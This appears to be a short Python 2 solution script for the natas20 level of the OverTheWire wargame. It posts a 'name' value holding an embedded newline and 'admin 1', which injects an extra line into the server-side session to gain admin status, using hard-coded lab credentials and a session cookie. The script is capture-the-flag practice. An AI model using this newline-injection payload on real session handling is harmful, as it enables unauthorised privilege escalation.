import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1'

AUTH = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

r = requests.post(TARGET_URL, data={'name':'admin\nadmin 1'}, auth=AUTH, cookies={'PHPSESSID':'332duorfm52nvjajttrb4dot91'}, timeout=5)

print r.text
print r.headers
